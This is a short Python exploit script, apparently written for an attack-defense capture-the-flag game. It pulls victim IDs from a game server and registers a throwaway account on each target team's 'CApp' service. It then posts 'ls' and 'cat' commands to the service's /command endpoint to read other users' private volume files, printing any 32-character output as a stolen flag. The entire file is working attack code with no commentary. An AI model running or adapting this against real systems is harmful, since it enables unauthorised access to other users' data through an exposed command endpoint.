#!/usr/bin/env python3
import random
import string

from pwn import remote
import sys
import json
import requests


def generate_random_string():
    length = random.randint(6, 10)
    letters = string.ascii_letters
    random_string = ''.join(random.choice(letters) for _ in range(length))
    return random_string.encode('utf-8')


#ip = "10.60.0.1"
ip = sys.argv[1]
response = requests.get(f"http://10.10.0.1:8081/flagIds?service=CApp&team={ip}")

r = requests.session()
ciao = r.post(f"http://{ip}/register", data={"username": generate_random_string(), "password": generate_random_string()})

for users in (response.json()['CApp'][ip]):
    vittim = json.loads(users)
    url = f"http://{ip}/command"
    command = f"ls .union./volume-{str(vittim['user_id'])}/"
    res = r.post(url, json={"command": command})
    resJon = json.loads(res.text)
    for i in (resJon['output'].split(" ")):
        command = f"cat .union./volume-{vittim['user_id']}/{i}"
        res2 = r.post(url, json={"command": command})
        almostFlag = json.loads(res2.text)['output']
        if len(almostFlag) == 32:
            print(str(almostFlag), flush=True)